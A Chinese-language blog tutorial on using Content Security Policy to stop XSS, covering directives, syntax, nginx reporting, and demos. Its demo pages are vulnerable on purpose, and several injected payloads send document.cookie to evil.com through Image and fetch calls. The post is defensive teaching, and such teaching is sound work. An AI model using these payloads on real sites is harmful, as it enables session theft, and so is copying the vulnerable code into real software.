---
title: web 安全之 - 使用CSP(Content Security Policy)来防止 XSS 攻击
date: 2022-10-09 13:32:09
tags: security
categories: web安全
---
## XSS
跨网站脚本(Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击)是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

即使到了 2022 年， 在 OWASP(Open Web Application Security Project，是一个开放式Web应用程序安全项目组织，旨在帮助计算机和互联网应用程序提供公正、实际、有成本效益的信息。) 的 top10 漏洞中， XSS 依然排名前三 (2021 年的第三名的 注入(Injection)，其中 XSS 就属于这一类)

正常我们常用的防护手段一般是**对于任何的参数请求以及页面中涉及到的用户信息全部都要进行特殊字符的过滤，进行 html转义，防止触发恶意脚本**

但是如果能够理解 XSS 的实际攻击方式，真的要对用户的利益造成损失的话 (不是单纯的只是弹个 alert 框)， 一般就两种方式:
1 注入恶意脚本，执行或者引导用户，从而盗取信息或者执行恶意操作
2 直接获取该页面上的用户信息，比如 cookie， 然后抛到攻击者自己的服务器

<!--more-->
所以如果我们可以严格限制网站运行的内容和抛送的接口的域名的白名单的话，那么攻击者将没办法得到我们用户的信息(执行不了恶意脚本，也抛送不了用户数据)

而这个就是 "内容安全政策"（Content Security Policy，缩写 CSP）的来历

## Content Security Policy
CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。

CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，也没法抛送数据，除非还控制了一台列入了白名单的可信主机。

从最新的[官网文档](https://web.dev/csp/)来看, CSP 已经发展到了第三个版本规范了，不过最新的[第三版规范](https://www.w3.org/TR/CSP3/)，各大浏览器还没有兼容。 所以目前主流是第二版规范。

本文也是主要讲第二版的规范相关的字段参数

## 相关指令
### 1. 指令列表
关于第二版的指令，具体可以看: [Policy applies to a wide variety of resources](https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources), 有些第一版的指令，虽然在第二版没有列出来，但是浏览器是有兼容的

|指令|说明|
|---|---|
| **default-src** | 针对 `xxx-src` 指令的默认行为 |
| **script-src** | 限制脚本加载白名单
| **base-uri**  | 指定 `<base>` 标签的 url 的值
| **child-src** | 限制内嵌框架，比如 frame， iframe 的域名白名单
| **connect-src** | 限定对外请求域名的白名单 (通过 XHR、WebSockets、EventSource等)
| **font-src** |  限定字体文件的请求域名白名单
| **form-action** | 限定 `<form>` 标签表单提交的白名单，就是 action 的域名白名单
| **frame-ancestors** | 指定可以嵌入当前页面的外部资源。 该指令适用于 `<frame>`、`<iframe>`、`<embed>` 和 `<applet>` 标记。 该指令不能在 `<meta>` 标记中使用，并且仅适用于非 HTML 资源。
| **frame-src** | 等同于 child-src，在第二版废弃过，第三版又恢复
| **img-src** | 限定图片加载域名白名单
| **media-src** |  限定视频和音频的加载域名白名单
| **object-src** |  插件加载白名单，比如 flash
| **plugin-types** | 限制可以使用的插件格式
| **report-uri** | 指定当违反内容安全策略时浏览器将发送报告的 URL。 此指令不能在 <meta> 标记中使用。 下面有 demo 演示
| **style-src** | 样式表加载白名单
| **upgrade-insecure-requests** | 自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议
| **worker-src** | 限制 worker 加载白名单(包含 shared worker，service worker)， 第三版才有， 支持有限

如果没有具体设置指令的话，就是默认全部开，没有限制。 一个一个设置其实很麻烦， 所以就有了一个默认的 src 的相关指令， `default-src`， 他其实就是针对所有的 `xxx-src` 的兜底。

只要是 `xxx-src`，比如 
- `script-src`
- `child-src`
- `connect-src`
- `font-src`
- `frame-src`
- `img-src`
- `media-src`
- `object-src`
- `style-src` 
- `worker-src` 

这几个都可以用 default-src 来兜底, 也就是说，只要我设置了 `default-src 'self'`

那就是以上这几个 `xxx-src` 的值都是 self 了 (也就是只允许当前域名加载)。如果后面再单独设置的话，比如 `font-src`， 那就会覆盖(不是继承，是直接覆盖配置)，也就是用自己的，不用默认的， 其他的 xxx-src 没有单独设置的，就会用 default-src 的

`default-src` 只能代替 `xxx-src` 兜底，其他的不是以 src 结尾的就不能代表了，比如以下这些
- `base-uri`
- `form-action`
- `frame-ancestors`
- `plugin-types`
- `report-uri`
- `sandbox`

要用的话，只能单独设置

### 2. 用法
用法也很简单，指令和指令之间用 `分号 ;` 隔开就行了。 
```text
Content-Security-Policy: key1 value11 value12 value13; key2 value21 value22;
```

如果需要设置多个域名白名单，那么就写多个，用空格分开即可，类似于 `script-src https://host1.com https://host2.com`

用法格式也很灵活,主要有 3 种:
1. **单纯指定协议** 比如 `data:`,  `https:`,  注意后面是有冒号的
2. **只有域名**，比如 `google.com`，  `api.googl.com`， `*.google.com`
3. **完整的 url 域名**, 比如 `https://api.google.com`,  `https://api.google.com:443`， `wss://*.google.com:*`， 基本上 `{协议}://{三级域名}.{二级域名}.{三级域名}:{端口}`， 括号里面的都可以用 * 表示通配

#### 2.1 value 特殊值
- `'none'` ->  不允许白名单
- `'self'` -> 限制当前域名，不包含子域名
- `'unsafe-inline'` -> 允许执行内联的 js 和 css 块， 包含 html dom 事件的 内联 js 
- `'unsafe-eval'` -> 允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数

> 一定要带单引号，如果不带单引号的话，意思会完全变掉
> `script-src 'self'`（带引号）授权从当前主机执行 JavaScript
> `script-src self` （无引号）允许来自名为“self”的服务器（而不是来自当前主机）的 JavaScript


#### 2.2 独属于 script-src / style-src 的特殊值
`script-src` 和 `style-src` 这两个指令除了上面的几个特殊值之外，还有两个他自己的特殊值
- **nonce** -> 每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行 (如果是 css 的话，就是 style 内嵌块)
- **hash** -> 列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行

主要是用于当没有设置 `'unsafe-inline'` 的值 (担心非法注入)， 但是又要执行内联的 script 块的时候，可以用

nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。
```text
Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
```
页面内嵌脚本，必须有这个token才能执行
```text
<script nonce=EDNnf03nceIOfn39fn3e9h3sdfa>
  // some code
</script>
```
hash值的例子如下，服务器给出一个允许执行的代码的hash值。
```text
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
```
下面的代码就会允许执行，因为hash值相符
```text
<script>alert('Hello, world.');</script>
```
> 注意，计算hash值的时候，`<script>`标签不算在内。

> 但是事实上我们根本就不需要在 html 页面内嵌 script 块，因为可以写到单独的 js 中 (换成样式就是单独的 css 文件)
> 也不需要在 html 标签中执行内联 js 函数，比如 onload， onclick， 因为可以写到 js 中用 addEventListener 来监听就行了
> 所以其实可以从写法上避免内联 js 和 css 的执行，因此我们不需要开放 `'unsafe-inline'` 的值，也不需要用到 `nonce` 和 `hash`

#### 2.3. unsafe-inline 含义
在实践过程中，我发现 `unsafe-inline` 包含两个层次
1. script 或者 style 执行块， 这个很好理解，就是 `<sctipt>...</script>` 和 `<style>...</style>`
2. html 标签中的监听事件和 style 属性， 这个比较不好懂，其实就是在 html 标签上，假设我设置了 `script-src` 或者 `style-src` 的白名单，并且没有允许 `‘unsafe-inline’`， 那么接下来的几个执行都会报错

```text
<meta http-equiv="Content-Security-Policy" content="default-src 'self';">
```

```text
<textarea type="text" style="background-color: green" value=""></textarea>
```

就会报这个错, 会建议你用 `nonce` 和 `hash` 来执行

![](1.png)

js 也是一样, 以下这三种都会包错
```text
<button onclick="say()">点击</button>   
```
```text
<button onclick="javascript:alert(1)">点击</button>
```

甚至连用 js 文件中的方法插入的 dom 标签，也是不行的
```html
function test() {
  let str=document.getElementById("text").value;
  document.getElementById("link").innerHTML="<a href='https://github.com/"+str+"' onclick='say()'>github Link</a>";
}
```
这时候生成这个 a 标签之后，点击的话，也是会报错的

![](2.png)

当然解决方法也是很简单，就是不要在 html 标签上直接绑定事件，而是在 js 文件中去绑定:
```html
document.getElementsByTagName("button")[0].addEventListener("click", test);
```
这样子就可以了。

#### 2.4. report-uri 含义
有时，我们不仅希望防止 XSS，还希望记录此类行为。report-uri就用来告诉浏览器，应该把注入行为报告给哪个网址。

下面会有 demo 演示，直接看 demo

#### 2.5 Content-Security-Policy-Report-Only
除了 `Content-Security-Policy`，还有一个`Content-Security-Policy-Report-Only` 字段，表示不执行限制选项，只是记录违反限制的行为。

它必须与report-uri选项配合使用。

下面会有 demo 演示，直接看 demo

## 生效方式
生效方式有两种:
1. 可以在页面的 meta 标签上设置
2. http(s) 返回的 response header 带上 Content-Security-Policy

两种方式都可以实现，不过针对 meta 标签的方式
```html
<meta http-equiv="Content-Security-Policy" content="default-src https://cdn.example.net; child-src 'none'; object-src 'none'">
```
有些指令是不生效的. 比如 `frame-ancestors`, `report-uri`, or `sandbox`， 将不会生效，这些指令只能在 header 头部才能生效

而且两个都设置的时候， header 的 `Content-Security-Policy` 会覆盖 meta 的设置， 简单来说，header 的优先级更高

## 实例 demo 演示

### 1. 简单的 sample demo
我们用 html 的 meta 标签来进行测试:
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>CSP TEST</title>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self'; style-src 'self';">
    <link rel="stylesheet" href="https://unpkg.zhimg.com/bootstrap@5.2.2/dist/css/bootstrap.css">
    <script src="https://unpkg.zhimg.com/bootstrap@5.2.2/dist/js/bootstrap.js"></script>
  </head>
  <body>
    <button>按钮</button>
  </body>
</html>
```

![](3.png)

会报 csp 的加载错误

![](4.png)

等同于:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self';">
```

![](5.png)

所以这时候要加入白名单:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' unpkg.zhimg.com; style-src 'self' unpkg.zhimg.com;">
或者这个
<meta http-equiv="Content-Security-Policy" content="default-src 'self' unpkg.zhimg.com;">
```
这两个对于本例来说是一样， 只不过 `default-src` 会更严格一点， 对于其他的 `xxx-src` 来说，比如 `img-src` 还是默认只允许本域 和 `unpkg.zhimg.com` 这个域才能加载图片。

### 2. 模拟DOM型 xss 的 demo
我们知道 xss 有 反射型，存储型， DOM 型，接下来我们一一模拟一下怎么用 csp 来阻止 xss 攻击

接下来构建一个基于 DOM Based 的 xss 页面， 这个页面的功能很简单， 就是输入你的 github 的用户， 为你生成一个跳转到  github 用户主页的连接，代码如下:
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>CSP DOM xss test</title>
  <head>
  <body>
    <script>
      function test() {
        let str=document.getElementById("text").value;
        document.getElementById("link").innerHTML="<a href='https://github.com/"+str+"' >github Link</a>";
      }
    </script>
    <textarea type="text" id="text" placeholder="输入github用户名" value=""></textarea>
    <button onclick="test()">点击生成 github 连接</button><br>
    <div id="link"></div>
  </body>
</html>
```
> 当然因为是为了演示 demo 使用，在代码上不会非常严谨

正常情况下，输入用户名肯定是没有问题的

![](9.png)

但是因为我们是直接写在 a 标签里面的， 所以是可以构造一个基于  dom 的 xss 漏洞的，比如我输入:
```text
jj' onclick="javascript:alert(1);return false;"
```
这时候就会劫持 a 标签的 click 事件，并弹出 `alert 1`

![](10.png)

更严重的一点，就是获取用户的 cookie ，然后传到 hacker 的服务, 可以在点击的时候，将 cookie 传到 hacker 的站点, 比如这样子:
```text
jj' onclick="javascript:var img = new Image();img.src=`https://evil.com/?cookie=${encodeURIComponent(document.cookie)}`;return false;"
```

![](11.png)

然后点击 link 的时候，就会以 img 的方式，将 cookie 抛送到服务器中

![](12.png)

#### 怎么防御
当然最简单的，不想 cookie 可以被 js 读取， 那么只需要将 cookie 设置为 `httponly` 属性即可。 但是 hacker 取不了 cookie 的话，也可以获取其他的数据，比如当前登录的用户名，邮箱等等。

因为本例是通过 img 标签来抛送数据的， 可以在 meta 标签设置 `img-src` 的属性
```text
<meta http-equiv="Content-Security-Policy" content="img-src 'self';">
```
加上这个 img-src 的限制，表示 img 加载只能加载当前域名的图片。这时候如果要通过 img 加载的方式来抛送数据的话，就会报错:
```text
Refused to load the image 'https://evil.com/?cookie=jenkins-timestamper-offset%3D-28800000' because it violates the following Content Security Policy directive: "img-src 'self'".
```
但是 hacker 有很多种方式来抛送数据，不仅仅是 img，还可以用 object， iframe， xhr，fetch 等等, 比如这个直接抛送 xhr 发 fetch 也是可以的，这个就可以绕过 img-src
```text
jj' onclick="javascript:fetch(`https://evil.com/?cookie=${encodeURIComponent(document.cookie)}`);return false;"
```
当然我可以再加这个限制，让 fetch 也不能用
```text
<meta http-equiv="Content-Security-Policy" content="img-src 'self';connect-src 'self'">
```
这时候就会报错了
```text
Refused to connect to 'https://evil.com/?cookie=jenkins-timestamper-offset%3D-28800000' because it violates the following Content Security Policy directive: "connect-src 'self'".
```
但是我还可以用 iframe， script， link 这种方式都可以， 所以如果要禁止你的页面往非法站点抛送请求的话，统一用
```text
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
这样子可以禁止所有的 `xxx-src` 的方式抛送请求, 在没有设置对应白名单的情况下，就没有办法往外读取或者抛送非当前域名的请求。

但是如果这样子的话，页面会有问题，因为对于 `script-src` 来说 ，只设置 self 的话，连内联的 script 都执行不了 (本例有两个内联 js 执行，一个是 script 块，一个 a 标签的 onclick 事件)，所以会报这个错误:
```text
Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-ypamui9krAqgslmkMenqJFLH+qgzHCrdeQRvJ77vI54='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```
会报这个错，所以我们可以再加上 `unsafe-inline` 表示允许执行 内联的 js （当然也可以用 `hash` 或者 `nonce` 的方式来允许内联 js 执行）
```text
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

这时候就可以执行内联的 js 快， 这时候如果再执行上面的 img 请求或者 fetch 请求的时候，就会报这个错

```text
Refused to load the image 'https://evil.com/?cookie=jenkins-timestamper-offset%3D-28800000' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.

Refused to connect to 'https://evil.com/?cookie=jenkins-timestamper-offset%3D-28800000' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.
```
如果要允许的话，比如我允许使用 fetch 请求，那么就要添加 `connect-src` 的白名单
```text
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' evil.com">
```
这样子执行 img 的时候，依然报错， 但是执行 fetch 的时候，就正常了。


### 3. 模拟反射型 xss 的 demo
再构建一个具有反射型的 xss demo:
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>CSP Reflective xss test</title>
  </head>
  <body>
    这个是主页的跳转页面，为了防止是机器人，请求手动点击: <a></a>
  </body>
  <script>
    let pos = document.URL.indexOf("name=") + 5;
    document.getElementsByTagName("a")[0].outerHTML = `<a href='https://github.com/${decodeURIComponent(document.URL.substring(pos,document.URL.length))}'>点击到 github 主页</a>`
  </script>
</html>
```

> 本来想构建一个更简单的，比如 `http://localhost/csp_test/2.html?name=<script>alert(1)</script>`, 后面发现现代浏览器会将字符 `<` 和 `>` （转化为`%3C` 和 `%3E`）， 所以并不会触发反射型 xss， 所以换了一个稍微绕一点的事例

这个内容很简单， 就是输入 github 的用户名，然后点击连接，就可以到用户主页

正常的用法是:

![](6.png)

但是我可以构造一个参数来重新劫持点击事件，并且将 cookie 发送到 hacker 站点， 我们要构建的串是
```html
kebingzao' onclick='javascript:fetch(`https://evil.com/?cookie=${encodeURIComponent(document.cookie)}`);return false;'
```
然后通过 `encodeURIComponent` 变成
```html
kebingzao'%20onclick%3D'javascript%3Afetch(%60https%3A%2F%2Fevil.com%2F%3Fcookie%3D%24%7BencodeURIComponent(document.cookie)%7D%60)%3Breturn%20false%3B'
```
所以最后的效果就是

![](7.png)

点击的时候，直接劫持，然后将 cookie 发送 evil 站点

![](8.png)

这边可以忽略掉 fetch 的跨域问题，因为数据已经抛送过去了。 危害已经造成了。

防御方式跟 上面例子的 `dom base xss` 一样，就是要设置 default-src 和 对应的 xxx-src 的值，不赘述。

### 4. 模拟存储型 xss 的 demo
还有一个存储型的 xss， 存储型的 xss， 一般都是通过提交，将具有 xss 的字串放在数据库。 然后在展示给用户的时候，直接触发里面的 js，一般常见于留言板之类的

我们可以用 `localstorage` 来当后端存储，然后页面刷新的时候， 取出来， 其实就是一个 存储型的 xss。代码很简单
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CSP Storage xss test</title>
</head>
<body>
  <ul id="list"></ul>
  <textarea id="message" required placeholder="留言板"></textarea>
  <button onclick="submit()">提交</button>
  <script>
  function getList() {
    let list = JSON.parse(localStorage.getItem("list") || "[]")
    return Array.isArray(list) ? list : [list]
  }
  function submit() {
    // 先存到 localstorage， 然后在渲染页面
    let list = getList()
    let message = document.getElementById("message").value
    document.getElementById("list").innerHTML += `<li>${message}</li>`
    list.push(message)
    localStorage.setItem("list", JSON.stringify(list))
  }
  // 加载填充
  let list = getList()
  list.forEach(item => {
    document.getElementById("list").innerHTML += `<li>${item}</li>`
  })
  </script>
</body>
</html>
```
正常的测试肯定没问题

![](13.png)

因为这些是存放在 localstorage 的， 所以重新刷新的时候，这些留言还存在。 这时候我们要构造一个 xss 出来
```html
<img src="1.jpg" onerror="javascript:fetch(`https://evil.com/?cookie=${encodeURIComponent(document.cookie)}`);return false;"/>
```
这时候就会触发存储型的这个 xss

![](14.png)

并且通过 img 的 error 将 cookie 抛送出去

![](15.png)

每次重新刷新， 这个数据重新渲染的时候， 都会再次触发这个存储型的 xss, 如果是这样子的话
```html
<img src="1.jpg" onerror="javascript:alert(1);return false;"/>
```
就会每次都会触发这个 alert 操作

![](16.png)

#### 怎么防御
那么怎么阻止这种内联的 alert 呢？ 就不要开启  unsafe-inline 就行了。 假设配置成这样子, 脚本只能从当前域执行:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```
上面两个 onerror， 因为不允许执行内联 js (所谓的 inline js，不仅仅只是 script 块， 甚至包括 html 里面的各种事件的内联监听都算):
```html
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-ZGX67r9yIissP08pxbswbch/DLnWkkpZ27cIdtQ9/IM='), or a nonce ('nonce-...') is required to enable inline execution.
```
所以就会报这个错。 现在我们将 `unsafe-inline` 设置为允许
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">
```
这时候重新刷新一下，就可以看到 alert 有弹了，但是 `fetch` 也可以用，因为 `connect-src` 并没有设置本域请求, 所以我们再加上 connect-src 的配置
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';connect-src 'self'">
```
这样子就会变成允许执行内联脚本，但是不允许通过 fetch, xhr 的方式往外抛送数据, 但是防不了类似 iframe, img, object 的 src 属性的请求， 所以直接设置 `default-src 'self'` 先干掉所有外链请求，然后再根据页面的实际情况慢慢做加法添加各种白名单。

### 5. report 的回报
接下来我们试一下 report uri 的效果，因为这个只能后端配置，不能用 meta 标签了， 所以我们用 nginx 来处理一下路由
```html
location = /csp/1.html {
    add_header Content-Security-Policy "script-src 'self'";
}
```
在 response 的时候，设置了 csp 头部， js 只能加载本域的， css 没有设置, 然后测试文件是:
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CSP TEST</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' unpkg.zhimg.com;">
  <link rel="stylesheet" href="https://unpkg.zhimg.com/bootstrap@5.2.2/dist/css/bootstrap.css">
  <script src="https://unpkg.zhimg.com/bootstrap@5.2.2/dist/js/bootstrap.js"></script>
</head>
<body>
  <button>按钮</button>
</body>
</html>
```
这个文件中，也有设置 csp 配置，并且是默认将 `unpkg.zhimg.com` 设置为白名单， 接下来我们测试一下:

![](17.png)

但是实际加载过程中， 可以看到 css 加载成功， js 加载失败， 说明取的是 header 上面的 csp 策略。 也就是 meta 的 csp 被 header 的 csp 覆盖了。

接下来我们配置 report-uri, 还是刚才的那个配置， 不允许 js 加载，只允许 css 加载
```html
location = /csp/1.html {
    add_header Content-Security-Policy "script-src 'self';report-uri /csp/report;";
}

location = /csp/report {
    return 200 "ok";
}
```
然后再请求一下，就可以看到有抛送这个 report 请求了

![](18.png)

汇报内容是:
```html
{
    "csp-report": {
        "document-uri": "http://127.0.0.1/csp/1.html",
        "referrer": "",
        "violated-directive": "script-src-elem",
        "effective-directive": "script-src-elem",
        "original-policy": "script-src 'self';report-uri /csp/report;",
        "disposition": "enforce",
        "blocked-uri": "https://unpkg.zhimg.com/bootstrap@5.2.2/dist/js/bootstrap.js",
        "status-code": 200,
        "script-sample": ""
    }
}
```

### 6. Content-Security-Policy-Report-Only
关于 `Content-Security-Policy`, 还有一个类似的头部 `Content-Security-Policy-Report-Only`

就是只预警，但是不禁止。 它必须与report-uri选项配合使用。
```html
location = /csp/1.html {
    #add_header Content-Security-Policy "script-src 'self';report-uri /csp/report;";
    add_header Content-Security-Policy-Report-Only "script-src 'self';report-uri /csp/report;";
}
```
所以可以看到， js 是可以请求了，但是 report 还是会抛送

![](19.png)

![](20.png)

## CSP 的验证站点
我们可以用 [Validate/Manipulate CSP Strings](https://cspvalidator.org/) 来查看站点的 CSP 配置是否合理以及内容。

以 [m.facebook.com](https://cspvalidator.org/#url=https://m.facebook.com) 为例，他的首页的 CSP 设置为:

![](21.png)

可以看到他设置的非常完善，除了设置 `default-src` 这个兜底配置之外，针对各个的 xxx-src 都有明确设置允许资源的白名单，从而有效防止 xss 攻击

## 总结
从上面的测试来看， 只有合理设置 CSP 的话，是完全可以阻止 xss 的。

所以还是要回到 xss 的触发机制上， 不管是反射型，DOM 型，还是存储型的 XSS，在进行恶意代码注入的时候，都离不开以下两个操作:
1. 内部执行恶意代码，执行恶意程序，包括自动关注，删除账号等恶意行为 (数据不往外抛送的情况)
2. 内部执行恶意代码，抛送包含用户 cookie 以及其他信息到 hacker 的站点，从而盗取用户信息 (数据往外抛送的情况)

所以要怎么通过设置 CSP 来阻止呢?
1. 首先要统一先设置 `default-src 'self'`, 先把所有的外部资源请求先控制在本站点，然后再根据各种资源的加载情况，比如各种 cdn 站点，来各自设置对应的 `xxx-src` 的白名单, 通过这一点可以有效阻止上述的第二种操作，即数据外抛
2. `script-src` 尽量不要设置 `unsafe-inline` 和 `unsafe-eval` 这两个值， 前者是为了防止注入的恶意代码会被内联执行(很多都是在 html 标签上注入内联代码)， 后面是为了防止有些 js 文件的逻辑里面有类似 `eval(str)` 直接解释执行的操作。 不开放这两个可以有效防止上述的第一种操作，即恶意操作。 如果真的有需要执行内联代码的话， 建议将 `<script>` 写到 js 文件里面去， 将 html 的各种监听事件也是用 `addEventListener` 监听的方式将逻辑写到 js 文件里面。 如果真的一定要内联执行，也务必要配合 `nonce` 和 `hash` 只执行你认为合法的内联代码，而不是恶意注入的
3. xss 的危害逃不过各种的盗取 cookie， 所以最好将 cookie 的属性设置 httponly，防止 cookie 被 js 读取
4. 另外还要注意 `jsonp` 的回调使用，`jsonp` 的本质就是用请求 js 文件的方式来进行接口请求(可以不受同源策略限制)，所以本质上就是引入一个外部的 js 文件， 所以服务端方要在白名单那边，不然就会有可能引入恶意 js 代码文件。然后客户端的调用方，也要注意防止内部注入代码恶意调用，因为正常 `jsonp` 的服务端都会读取 `callback` 参数的值，然后将 `callback` 参数的值取出来，再将返回值连同小括号放到后面，比如正常的调用是这个`/path/jsonp?callback=_jsonpcb`, 然后服务端返回 `_jsonpcb({"msg":"success"})`, 但是如果调用方被恶意注入的话，他就可以这样子写 `callback=alert(document.domain)//`, 这时候服务端返回的 js 文件内容就会变成 `alert(document.domain)//({"msg":"success"})`， 就会执行 alert， 从而忽略返回值。 这个就是恶意调用

综上所述，如果能做到以上几种，那么你的页面将可以有效的防止 xss 的攻击。 当然还是要注意一点的是，再坚固的防御，有内贼的话，也是没用，所以对于白名单的设置，一定要确认无害才设置。

---

参考资料:
- [Content security policy](https://web.dev/csp/)
- [Content Security Policy 入门教程](http://www.ruanyifeng.com/blog/2016/09/csp.html)
- [XSS跨站脚本攻击](https://www.cnblogs.com/phpstudy2015-6/p/6767032.html)
- [XSS漏洞学习笔记](https://www.cnblogs.com/huahuot/p/9122338.html)




